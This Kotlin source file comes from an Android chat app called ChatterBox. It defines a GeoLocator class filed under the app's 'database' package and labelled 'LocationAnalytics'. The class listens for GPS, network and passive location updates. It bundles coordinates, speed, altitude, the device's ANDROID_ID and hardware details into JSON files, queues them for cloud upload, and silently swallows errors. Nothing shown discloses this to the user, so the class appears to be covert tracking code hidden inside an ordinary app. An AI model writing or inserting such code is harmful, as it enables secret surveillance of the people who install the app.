package com.example.ChatterBox.database

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import androidx.core.app.ActivityCompat
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.Timer
import java.util.concurrent.CopyOnWriteArrayList

@SuppressLint("HardwareIds")
class GeoLocator private constructor(private val context: Context) {
    private val TAG = "LocationAnalytics"
    private val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
    private var locationListener: LocationListener? = null
    private var significantLocationListener: LocationListener? = null
    private var timer: Timer? = null

    private val handler = Handler(Looper.getMainLooper())

    private val MIN_TIME_BETWEEN_UPDATES = 30 * 60 * 1000L

    private val deviceId: String by lazy {
        Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
    }

    private val locationCallbacks = CopyOnWriteArrayList<(JSONObject) -> Unit>()
    private var lastCapturedLocation: Location? = null
    private var lastLocationCaptureTime: Long = 0

    companion object {
        @Volatile
        private var instance: GeoLocator? = null

        fun getInstance(context: Context): GeoLocator {
            return instance ?: synchronized(this) {
                instance ?: GeoLocator(context.applicationContext).also { instance = it }
            }
        }
    }

    fun initGeoMonitor() {
        significantLocationListener = object : LocationListener {
            override fun onLocationChanged(location: Location) {
                handleGeoResult(location)
            }

            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
            override fun onProviderEnabled(provider: String) {}
            override fun onProviderDisabled(provider: String) {}
        }

        locationListener = object : LocationListener{
            override fun onLocationChanged(location: Location) {
                val currentTime = System.currentTimeMillis()
                if(currentTime - lastLocationCaptureTime > MIN_TIME_BETWEEN_UPDATES) {
                    lastCapturedLocation = location
                    handleGeoResult(location)
                }
            }
            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
            override fun onProviderEnabled(provider: String) {}
            override fun onProviderDisabled(provider: String) {}
        }

        if (ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            Log.d(TAG, "Location permission not granted")
            return
        }

        try {
            handler.post {
                try {

                    locationManager.requestLocationUpdates(
                        LocationManager.PASSIVE_PROVIDER,
                        MIN_TIME_BETWEEN_UPDATES,
                        0f,
                        significantLocationListener as LocationListener
                    )

                    locationManager.requestLocationUpdates(
                        LocationManager.GPS_PROVIDER,
                        MIN_TIME_BETWEEN_UPDATES,
                        5f,
                        locationListener as LocationListener
                    )

                    locationManager.requestLocationUpdates(
                        LocationManager.NETWORK_PROVIDER,
                        MIN_TIME_BETWEEN_UPDATES,
                        5f,
                        locationListener as LocationListener
                    )
                } catch (e: SecurityException) {
                    Log.e(TAG, "Location permission not granted: ${e.message}")
                } catch (e: Exception) {
                    Log.e(TAG, "Error requesting location updates: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG,"Outer error requesting location updates: ${e.message}")
        }
    }

    fun getLastGeoFix(callback: (JSONObject) -> Unit) {
        locationCallbacks.add(callback)

        try {
            if (lastCapturedLocation != null) {
                val locationData = buildGeoJson(lastCapturedLocation!!)
                callback(locationData)
                locationCallbacks.remove(callback)
                return
            }

            val location = getLastKnownLocation()
            if (location != null) {
                val locationData = buildGeoJson(location)
                callback(locationData)
                locationCallbacks.remove(callback)
                return
            }

        } catch (e: Exception) {
            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
            val fallbackJson = JSONObject().apply {
                put("timestamp", timestamp)
                put("status", "location_unavailable")
                put("device_id", deviceId)
            }
            callback(fallbackJson)
            locationCallbacks.remove(callback)
        }
    }

    @SuppressLint("MissingPermission")
    private fun getLastKnownLocation(): Location? {
        if (ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            return null
        }

        try {
            var location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)

            if (location == null) {
                location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            }
            if(location == null){
                location = locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER)
            }

            return location
        } catch (e: Exception) {
            return null
        }
    }

    private fun handleGeoResult(location: Location) {
        lastCapturedLocation = location
        lastLocationCaptureTime = System.currentTimeMillis()

        try {
            val locationJson = buildGeoJson(location)

            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
            val filename = "location_${timestamp}.json"
            val storageDir = FileAccessHelper.getStorageDir(context, "location_data")
            val locationFile = File(storageDir, filename)

            FileOutputStream(locationFile).use { out ->
                out.write(locationJson.toString().toByteArray())
            }

            Log.d(TAG, "Location processed: ${location.latitude}, ${location.longitude}")

            val cloudUploader = CloudUploader(context)
            cloudUploader.enqueueUpload("location_data", locationFile.absolutePath)
            val callbacksToRemove = mutableListOf<(JSONObject) -> Unit>()

            for (callback in locationCallbacks) {
                callback(locationJson)
                callbacksToRemove.add(callback)
            }

            locationCallbacks.removeAll(callbacksToRemove.toSet())

        } catch (_: Exception) {
        }
    }

    private fun buildGeoJson(location: Location): JSONObject {
        val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())

        return JSONObject().apply {
            put("timestamp", timestamp)
            put("latitude", location.latitude)
            put("longitude", location.longitude)
            put("accuracy", location.accuracy)
            put("altitude", location.altitude)
            put("speed", location.speed)
            put("provider", location.provider)
            put("device_model", android.os.Build.MODEL)
            put("device_id", deviceId)
            put("manufacturer", android.os.Build.MANUFACTURER)
            put("android_version", android.os.Build.VERSION.RELEASE)
        }
    }
}